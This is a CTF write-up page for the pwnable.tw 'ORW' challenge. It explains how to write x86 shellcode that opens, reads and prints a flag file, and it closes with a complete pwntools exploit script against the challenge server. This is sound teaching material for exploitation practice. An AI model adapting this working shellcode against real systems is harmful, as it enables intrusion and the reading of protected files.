<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ORW [pwnable.tw] | CTF Writeup</title>
    <meta name="description" content="This is a pretty awesome challenge! Here we will be writing assembly code in x86 to read the flag file from the server. This is one of the easier challenge in p...">
    <link href="/src/index.css" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <style>
        body { 
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
        }
        .code-block {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1rem;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
        }
        .gradient-text {
            background: linear-gradient(135deg, #f97316, #f59e0b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .video-embed { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 8px; border: 1px solid #374151; background: #0f0f0f; margin: 1.5rem 0; }
        .video-embed iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
        .toc-sidebar {
            position: fixed;
            top: 2rem;
            left: 1rem;
            max-height: calc(100vh - 4rem);
            overflow-y: auto;
            background: #1a1a1a;
            border: 1px solid #374151;
            border-radius: 0.75rem;
            padding: 1.5rem;
            margin-right: 0;
            width: 280px;
            flex-shrink: 0;
            z-index: 10;
        }
        .toc-title {
            font-size: 0.875rem;
            font-weight: 600;
            color: #9ca3af;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 1rem;
            border-bottom: 1px solid #374151;
            padding-bottom: 0.5rem;
        }
        .toc-list { list-style: none; padding: 0; margin: 0; }
        .toc-sublist { list-style: none; padding-left: 0.5rem; margin-top: 0.25rem; }
        .toc-item { margin: 0.25rem 0; }
        .toc-level-2 { padding-left: 0.25rem; }
        .toc-level-3 { padding-left: 0.75rem; }
        .toc-level-4 { padding-left: 1.25rem; }
        .toc-link { display: block; color: #9ca3af; text-decoration: none; font-size: 0.875rem; line-height: 1.5; padding: 0.25rem 0; border-radius: 0.25rem; transition: all 0.2s; }
        .toc-link:hover { color: #60a5fa; background: #1f2937; padding-left: 0.5rem; }
        @media (max-width: 1024px) { .toc-sidebar { display: none; } }
        .prose h1 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2.5rem; font-weight: 800; margin-top: 3rem; margin-bottom: 1.5rem; }
        .prose h2 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2rem; font-weight: 700; margin-top: 3rem; margin-bottom: 1rem; border-bottom: 2px solid #374151; padding-bottom: 0.5rem; }
        .prose h3 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 1.5rem; font-weight: 600; margin-top: 2rem; margin-bottom: 0.75rem; }
        .prose h4 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 1.25rem; font-weight: 600; margin-top: 1.5rem; margin-bottom: 0.5rem; }
        .prose p { margin-bottom: 1.5rem; line-height: 1.7; color: #d1d5db; }
        .prose strong { color: #f3f4f6; font-weight: 600; }
        .prose code { background: #1e1e1e; color: #fbbf24; padding: 0.25rem 0.5rem; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.9em; }
        .prose pre { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 1.5rem; overflow-x: auto; margin: 2rem 0; }
        .prose pre code { background: transparent; color: #e5e7eb; padding: 0; border-radius: 0; }
        .prose blockquote { background:rgb(93, 45, 26); color:rgb(255, 255, 255); border-left: 4px solid #ff8c00; padding: 1rem 1.25rem; margin: 1.25rem 0; border-radius: calc(var(--radius) - 2px); }
        .prose ul, .prose ol { list-style-color: #ff8c00; list-style-type: disc; list-style-position: outside; margin: 1.5rem 0; padding-left: 2rem; }
        .prose li { margin: 0.5rem 0; color: #d1d5db; }
        .prose li::marker { color: #ff8c00 !important; }
        .prose ol li { list-style-type: decimal; }
        .prose img { border-radius: 8px; margin: 2rem 0; max-width: 100%; }
        .prose hr { border: none; height: 2px; background: linear-gradient(90deg, transparent, #374151, transparent); margin: 3rem 0; }
    </style>
</head>
<body class="min-h-screen">
    <div class="container mx-auto max-w-7xl px-4 sm:px-6 lg:px-4 py-8 relative">
        <header class="mb-12">
            <a href="/writeups" class="text-emerald-400 hover:text-emerald-300 mb-4 inline-block">← Back</a>
            <h1 class="text-4xl md:text-5xl font-bold mb-4">
                <span class="gradient-text">ORW [pwnable.tw]</span>
            </h1>
            <div class="mb-8"><img src="/writeups/1728230795518-ORW-[pwnable.tw]/featured.png" alt="ORW [pwnable.tw] cover image" class="w-full h-64 md:h-80 object-cover rounded-lg shadow" loading="eager"></div>
            <div class="flex items-center gap-4 text-sm text-gray-400 mb-6">
                <span>July 16, 2020</span>
                <span>•</span>
                <span>3 min read</span>
                
                
                
                <span>•</span><div class="flex gap-2"><span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">pwnable.tw</span></div>
            </div>
        </header>

        <div class="flex flex-col lg:flex-row justify-start gap-6">
            <aside class="hidden lg:block"><nav class="toc-sidebar"><h3 class="toc-title">Table of Contents</h3><ul class="toc-list"><ul class="toc-sublist"><li class="toc-item toc-level-2"><a href="#solution" class="toc-link">Solution:</a></li><li class="toc-item toc-level-2"><a href="#idea" class="toc-link">Idea:</a></li><li class="toc-item toc-level-2"><a href="#exploit" class="toc-link">Exploit:</a></li><li class="toc-item toc-level-2"><a href="#part-1" class="toc-link">Part 1</a></li><li class="toc-item toc-level-2"><a href="#part-2" class="toc-link">Part 2</a></li><li class="toc-item toc-level-2"><a href="#part-3" class="toc-link">Part 3</a></li></ul></ul></nav></aside>
            <article class="prose prose-invert max-w-none ml-0 lg:max-w-6xl lg:ml-10">
<p>This is a pretty awesome challenge! Here we will be writing assembly code in x86 to read the flag file from the server. This is one of the easier challenge in pwnable.tw which is stack based.</p>
<!--more-->
<p><img src="/images/pwnable2/pwnable1.png" alt="" /></p>
<h2 id="solution">Solution:</h2>
<p>First I check the mitigations :</p>
<p><img src="/images/pwnable2/pwnable2.png" alt="" /></p>
<ul>
<li>We have NX disabled. That means it is something to do with the shellcode.</li>
<li>Seems like there is a canary which will not allow you to do a stack based buffer overflows.</li>
<li>there is no pie so the address of the binary will be same every time you run.</li>
</ul>
<p>Let's see the disassembly of this program<br />
<img src="/images/pwnable2/pwnable.gif" alt="" /></p>
<p>Here we can see that our input is being put in the address <code>0x804a060</code> and then it is moved to EAX and then after that EAX is called.<br />
Meaning: our input is being executed. Now, let us run the binary and see what is happening :&gt;</p>
<p><img src="/images/pwnable2/pwnable3.png" alt="" /></p>
<blockquote>
  <p>Hmm… We get a segfault.</p>
</blockquote>
<h2 id="idea">Idea:</h2>
<ul>
<li>As said in the question we will you three syscalls and then get the flag</li>
<li>First call: open the flag file</li>
<li>Second call: read the file</li>
<li>Third call: write it to the output</li>
</ul>
<h2 id="exploit">Exploit:</h2>
<p>We will see the exploit in parts.</p>
<h2 id="part-1">Part 1</h2>
<p><img src="/images/pwnable2/pwnable4.png" alt="" /></p>
<ul>
<li>We make EAX to 5</li>
<li>we push the string "///home/orw/flag"</li>
<li>We make EBX pointing to the stack ( the string )</li>
<li>We make EDX equal to 0 and then we make the syscall.</li>
</ul>
<h2 id="part-2">Part 2</h2>
<p><img src="/images/pwnable2/pwnable5.png" alt="" /></p>
<ul>
<li>We make EAX equal to 3</li>
<li>We make ECX point to the string</li>
<li>Give EDX the buffer size</li>
<li>Call the syscall</li>
</ul>
<h2 id="part-3">Part 3</h2>
<p><img src="/images/pwnable2/pwnable6.png" alt="" /></p>
<ul>
<li>We make EAX equal to 4</li>
<li>Make EBX equal to 0</li>
<li>Add 1 to EBX / making EBX equal to 1. Then call the syscall.</li>
</ul>
<blockquote>
  <p>Refer to the below image if having any doubts !!</p>
</blockquote>
<p><img src="/images/pwnable2/pwnable7.png" alt="" /></p>
<p>If we put all of the things together, then we get the flag.</p>
<p><img src="/images/pwnable2/pwnable8.png" alt="" /></p>
<pre><code class="py language-py">from pwn import *
p = remote('chall.pwnable.tw',10001)
print p.recv()
s = asm("xor eax, eax")
s += asm("push eax")
s += asm("add eax, 5")
s += asm("push 0x67616c66")
s += asm("push 0x2f77726f")
s += asm("push 0x2f656d6f")
s += asm("push 0x682f2f2f")
s += asm("mov ebx, esp")
s += asm("mov edx, 0")
s += asm("int 0x80")
s += asm("mov eax, 3")
s += asm("mov ecx, ebx")
s += asm("mov ebx, 3")
s += asm("mov edx, 40")
s += asm("int 0x80")
s += asm("mov eax, 4")
s += asm("mov ebx, 0")
s += asm("inc ebx")
s += asm("int 0x80")
p.send(s)
f = p.recv()
print f
p.interactive()
</code></pre>
<blockquote>
  <p>update: Back when I wrote this, it was python2, times were good.</p>
</blockquote>
<p>If you want to try out more pwnable.tw but are stuck you can checkout <a href="https://github.com/tourpran/pwn-hub/tree/main/pwnable.tw">pwn-hub: pwnable.tw</a> repo</p>
            </article>
        </div>
        <!-- Navigation -->
        <nav class="mt-16 pt-8 border-t border-gray-700">
            <div class="flex justify-between items-center">
                <div class="flex-1">
                    <a href="/writeups/1728230780562-start-[pwnable.tw].html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
                        </svg>
                        <div class="text-left">
                            <div class="text-xs text-gray-400">Previous</div>
                            <div class="font-medium">start [pwnable.tw]</div>
                        </div>
                    </a>
                </div>
                <div class="flex-1 text-center">
                    <a href="/writeups" class="text-emerald-400 hover:text-emerald-300 transition-colors font-medium">All Writeups</a>
                </div>
                <div class="flex-1 text-right">
                    <a href="/writeups/1728230734805-c4n4ry-[zh3r0-CTF].html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
                        <div class="text-right">
                            <div class="text-xs text-gray-400">Next</div>
                            <div class="font-medium">c4n4ry [zh3r0 CTF]</div>
                        </div>
                        <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                        </svg>
                    </a>
                </div>
            </div>
        </nav>
        </nav>
    </div>
<script>window.addEventListener('DOMContentLoaded',()=>{try{document.querySelectorAll('pre code').forEach((el)=>window.hljs&&window.hljs.highlightElement(el));}catch(e){console.warn('hljs init failed',e);}});</script>
</body>
</html>